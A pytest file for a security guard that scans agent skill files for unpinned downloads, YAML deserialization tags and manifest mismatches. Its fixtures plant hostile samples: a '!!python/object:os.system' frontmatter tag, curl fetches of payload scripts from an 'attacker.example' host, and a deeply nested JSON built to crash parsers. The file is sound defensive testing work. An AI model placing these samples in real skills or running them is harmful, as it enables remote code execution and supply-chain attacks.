"""Tests for AgenticSkillsAstGuard — planted-violation + FP-bait per rule."""
from __future__ import annotations

from agentsec.guards.agentic_skills_ast import AgenticSkillsAstGuard
from tests.guards._common import *  # noqa: F401,F403


def _prof(root: Path) -> StackProfile:
    return mkprofile(root, features={"python"}, python_dirs=["."])


# ── unpinned-external-resource ───────────────────────────────────────────────

def test_unpinned_curl_fetch_fires(tmp_path: Path) -> None:
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\n---\n\nSetup:\n\ncurl -fsSL https://example.com/install.sh -o install.sh\n",
        encoding="utf-8",
    )
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "agentic-skills-ast/unpinned-external-resource" for f in findings)


def test_pinned_curl_fetch_is_safe(tmp_path: Path) -> None:
    """FP-bait: a commit-pinned URL is not a moving-target supply chain."""
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\n---\n\n"
        "curl -fsSL https://raw.githubusercontent.com/org/repo/abcdef1234567890/install.sh -o install.sh\n",
        encoding="utf-8",
    )
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


def test_unpinned_npx_package_fires(tmp_path: Path) -> None:
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\n---\n\nRun: npx some-tool --flag\n", encoding="utf-8",
    )
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "agentic-skills-ast/unpinned-external-resource" for f in findings)


def test_pinned_npx_package_is_safe(tmp_path: Path) -> None:
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\n---\n\nRun: npx some-tool@1.2.3 --flag\n", encoding="utf-8",
    )
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


# ── deserialization-tag-in-frontmatter ───────────────────────────────────────

def test_deserialization_tag_fires(tmp_path: Path) -> None:
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\nhandler: !!python/object:os.system\n---\n\nBody.\n",
        encoding="utf-8",
    )
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "agentic-skills-ast/deserialization-tag-in-frontmatter" for f in findings)


def test_ordinary_frontmatter_is_safe(tmp_path: Path) -> None:
    """FP-bait: normal scalar frontmatter fields carry no deserialization primitive."""
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\ndescription: A normal skill\n---\n\nBody.\n", encoding="utf-8",
    )
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


# ── cross-platform-manifest-disagreement ─────────────────────────────────────

def test_manifest_name_mismatch_fires(tmp_path: Path) -> None:
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text("---\nname: my-skill\nversion: 1.0.0\n---\n\nBody.\n", encoding="utf-8")
    (d / "skill.json").write_text('{"name": "totally-different", "version": "1.0.0"}', encoding="utf-8")
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "agentic-skills-ast/cross-platform-manifest-disagreement" for f in findings)


def test_matching_manifest_is_safe(tmp_path: Path) -> None:
    """FP-bait: a manifest that agrees with SKILL.md's own identity is fine."""
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text("---\nname: my-skill\nversion: 1.0.0\n---\n\nBody.\n", encoding="utf-8")
    (d / "skill.json").write_text('{"name": "my-skill", "version": "1.0.0"}', encoding="utf-8")
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


def test_no_manifest_is_safe(tmp_path: Path) -> None:
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text("---\nname: my-skill\nversion: 1.0.0\n---\n\nBody.\n", encoding="utf-8")
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


# ── suppression ───────────────────────────────────────────────────────────

def test_pragma_suppresses_all_findings(tmp_path: Path) -> None:
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text(
        "# security: allow-agentic-skills-ast\n"
        "---\nname: my-skill\n---\n\ncurl -fsSL https://example.com/install.sh -o install.sh\n",
        encoding="utf-8",
    )
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


def test_guard_applies_universally(tmp_path: Path) -> None:
    assert AgenticSkillsAstGuard().applies(_prof(tmp_path)) is True


# ── review-round fixes: loopback hosts, flag tokens, BOM ─────────────────────

def _skill_dir(tmp_path: Path) -> Path:
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    return d


def test_localhost_health_check_is_not_unpinned(tmp_path: Path) -> None:
    """FP-bait: a loopback health check fetches nothing an attacker controls."""
    d = _skill_dir(tmp_path)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\n---\n\n"
        "curl -s http://localhost:8100/health\n"
        "curl -s http://127.0.0.1:8200/health\n"
        "curl -s http://[::1]:8300/health\n"
        "curl -s http://0.0.0.0:8400/health\n",
        encoding="utf-8",
    )
    assert AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path)) == []


def test_ipv4_mapped_ipv6_loopback_is_not_unpinned(tmp_path: Path) -> None:
    """FP-bait, and the guard's own self-audit's own concern: `::ffff:127.0.0.1` is a genuine
    loopback address, unwrapped before the `is_loopback` check the same way sibling guards do."""
    d = _skill_dir(tmp_path)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\n---\n\ncurl -s http://[::ffff:127.0.0.1]:8100/health\n",
        encoding="utf-8",
    )
    assert AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path)) == []


def test_hostname_starting_with_127_still_fires(tmp_path: Path) -> None:
    """Direction traded against: a hostname that merely STARTS with the text "127." is not a
    loopback IP literal. The old string-prefix test classified this as a health check."""
    d = _skill_dir(tmp_path)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\n---\n\n"
        "curl -s http://127.attacker.example/payload.sh\n"
        "curl -s https://127.attacker.example:8080/install.sh\n",
        encoding="utf-8",
    )
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert len(findings) == 2
    assert all("127.attacker.example" in f.message for f in findings)


def test_remote_curl_still_fires_next_to_localhost(tmp_path: Path) -> None:
    d = _skill_dir(tmp_path)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\n---\n\n"
        "curl -s http://localhost:8100/health\n"
        "curl -fsSL https://example.com/install.sh -o install.sh\n",
        encoding="utf-8",
    )
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert len(findings) == 1 and "example.com" in findings[0].message


def test_pip_flags_are_not_package_names(tmp_path: Path) -> None:
    d = _skill_dir(tmp_path)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\n---\n\n"
        "pip install -r requirements.txt\n"
        "pip install --index-strategy unsafe-best-match foo==1.0\n",
        encoding="utf-8",
    )
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert not any("'-r'" in f.message or "'--index-strategy'" in f.message for f in findings)


def test_unpinned_pip_package_still_fires(tmp_path: Path) -> None:
    d = _skill_dir(tmp_path)
    (d / "SKILL.md").write_text("---\nname: my-skill\n---\n\npip install requests\n", encoding="utf-8")
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert any("requests" in f.message for f in findings)


def test_utf8_bom_manifest_and_skill_still_checked(tmp_path: Path) -> None:
    d = _skill_dir(tmp_path)
    (d / "SKILL.md").write_text("---\nname: my-skill\n---\n\nBody.\n", encoding="utf-8-sig")
    (d / "skill.json").write_text('{"name": "other-name"}', encoding="utf-8-sig")
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "agentic-skills-ast/cross-platform-manifest-disagreement" for f in findings)


def test_npx_flags_are_skipped_but_the_package_is_still_judged(tmp_path: Path) -> None:
    d = _skill_dir(tmp_path)
    (d / "SKILL.md").write_text(
        "---\nname: my-skill\n---\n\nnpx --yes create-thing\nnpx -y other-thing@1.2.3\n",
        encoding="utf-8",
    )
    msgs = [f.message for f in AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))]
    assert any("create-thing" in m for m in msgs)
    assert not any("'--yes'" in m or "other-thing" in m for m in msgs)


def test_deeply_nested_manifest_does_not_zero_the_guard(tmp_path: Path) -> None:
    """A hostile deep-nesting `skill.json` used to raise RecursionError out of the manifest probe;
    the real disagreement in a neighbouring skill must still be reported."""
    bad = tmp_path / "skills" / "other-skill"
    bad.mkdir(parents=True)
    (bad / "SKILL.md").write_text("---\nname: other-skill\n---\n\nBody.\n", encoding="utf-8")
    (bad / "skill.json").write_text('{"name": ' + "[" * 200_000 + "]" * 200_000 + "}", encoding="utf-8")
    d = tmp_path / "skills" / "my-skill"
    d.mkdir(parents=True)
    (d / "SKILL.md").write_text("---\nname: my-skill\nversion: 1.0.0\n---\n\nBody.\n", encoding="utf-8")
    (d / "skill.json").write_text('{"name": "totally-different", "version": "1.0.0"}', encoding="utf-8")
    findings = AgenticSkillsAstGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "agentic-skills-ast/cross-platform-manifest-disagreement" for f in findings)
